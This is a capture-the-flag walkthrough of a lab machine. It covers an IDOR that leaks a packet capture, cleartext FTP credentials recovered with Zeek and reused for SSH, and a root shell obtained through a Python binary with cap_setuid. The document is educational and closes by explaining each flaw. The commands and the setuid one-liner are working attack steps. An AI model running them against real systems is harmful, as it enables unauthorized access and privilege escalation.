---
tags:
        #IDOR
        #pcap
        #Capabilities
        #Python
        #Gunicorn
---

## 1. Enumeration

### Nmap Scan
The initial reconnaissance begins with a standard Nmap scan to identify active services on the target machine.

```bash
nmap 10.129.6.165 -Pn -sV -sC

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Gunicorn
|_http-title: Security Dashboard
|_http-server-header: gunicorn
```

### Framework Guessing & Service Analysis
The HTTP server header reveals **Gunicorn** (Green Unicorn), which is a Python WSGI HTTP Server. 

*   **Technology Stack:** The use of Gunicorn strongly suggests the backend is written in **Python**.
*   **Framework Identification:** Since common PHP endpoints (like `.php` files) are not present and a search for the default Django `/admin` page returned nothing, the web application was assumed to be built using the **Flask** framework.

### Metadata Analysis (wget vs curl)
During enumeration, a search was performed for a `Changelog-diff.html` report. To ensure the highest fidelity of the downloaded file, `wget` was chosen over `curl`.

**Reasoning:** While both tools can download files, `wget` is often preferred when metadata preservation is important. By default, `wget` can preserve the **Last-Modified** timestamp (using `-N` or automatically in some versions), allowing the use of `exiftool` to inspect the correct modification time and other metadata that might have been lost during a standard `curl` output redirection.

---

## 2. Web Exploitation (IDOR)

While navigating the "Security Dashboard," an interesting URL structure was noticed in the **Security Snapshot** page: `http://10.129.6.165/data/1`.

### Insecure Direct Object Reference (IDOR)
The application assigns a numerical ID to security captures. **IDOR** was tested by manipulating the ID in the URL.

*   Navigating to `/data/1` showed a capture with limited information.
*   Pivoting to **`/data/0`** revealed a successful capture that was previously hidden or indexed as the first entry.

This endpoint allowed for the download of a **pcap** file representing the network traffic captured at that index.

---

## 3. Traffic Analysis (pcap Analysis)

The downloaded `0.pcap` file contains captured network traffic from the host. Since FTP is a cleartext protocol, `tcpdump` was used to inspect the packets.

```bash
tcpdump -r 0.pcap
```

Alternatively, **Zeek** (formerly Bro) was used to perform a more structured analysis. Zeek excels at protocol-level parsing and generates high-level logs that are easier to query than raw packet streams.

```bash
zeek -Cr 0.pcap
```

**Explanation:** 
Running `zeek -Cr` processes the pcap file and generates several log files (e.g., `conn.log`, `ftp.log`, `http.log`). In this scenario, checking `ftp.log` provides a clear summary of FTP commands and arguments, directly exposing the credentials without having to reconstruct the TCP stream manually.

#### Directory Viewpoint
After running Zeek, the current directory is populated with several `.log` files:

```bash
ls *.log
# conn.log  dns.log  ftp.log  files.log  packet_filter.log  ssh.log  stats.log
```

#### File Viewpoint (ftp.log)
Inspecting `ftp.log` reveals the specific FTP interactions:

```bash
cat ftp.log | zeek-cut user password command arg
# nathan  Buck3tH4TF0RM3!  USER  nathan
# nathan  Buck3tH4TF0RM3!  PASS  Buck3tH4TF0RM3!
```

**Key Discovery:**
In the packet stream, an unencrypted FTP login session was identified:

1.  **User:** `nathan`
2.  **Password:** `Buck3tH4TF0RM3!`

The pcap revealed the login process:
`FTP: USER nathan` -> `331 Please specify the password.` -> `FTP: PASS Buck3tH4TF0RM3!` -> `230 Login successful.`

---

## 4. Initial Access (FTP & SSH)

### FTP Login
FTP was used to log in and verify the credentials, revealing the user flag.

```bash
ftp 10.129.6.165
# Logged in as nathan
```

### SSH Access (Password Reuse)
Testing for **password reuse**, an attempt was made to log in via SSH using the same credentials found in the traffic capture.

```bash
ssh nathan@10.129.6.165
# Success: Logged in as nathan
```

---

## 5. Privilege Escalation (User: root)

After gaining access as `nathan`, a check was performed for misconfigured binaries and capabilities.

### Linux Capabilities Enumeration
Standard `sudo -l` didn't yield anything interesting, so a search was conducted for files with extended capabilities.

```bash
find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \; 2>/dev/null
```

**Key Discovery:**
```text
/usr/bin/python3.8 = cap_setuid+ep
```
The **`cap_setuid+ep`** capability on the Python binary allows the process to manipulate its own UID. Specifically, it can set its UID to 0 (root).

### Exploitation via Python
The capability was leveraged to escalate to root by importing the `os` module and setting the UID to 0 before spawning a bash shell.

```bash
/usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

This successfully spawned a root shell.

---

## 6. Vulnerability Principles

### Insecure Direct Object Reference (IDOR)
IDOR occurs when an application uses user-supplied input to access objects directly without proper authorization checks. In this case, the application failed to verify if the user requesting `/data/0` had the right to access that specific capture, leading to the exposure of sensitive network traffic.

### Cleartext Protocols & Traffic Sniffing
The reliance on **FTP**, which transmits credentials in cleartext, allowed for the interception of sensitive information. This highlights the danger of using unencrypted protocols and the value of traffic analysis (pcap) in identifying lateral movement or credential harvesting opportunities.

### Insecure Linux Capabilities
Capabilities are used to provide fine-grained control over privileges. However, granting `cap_setuid` to an interpreter like **Python** is equivalent to giving full root access, as the interpreter can execute arbitrary code to change its identity and perform any action on the system.
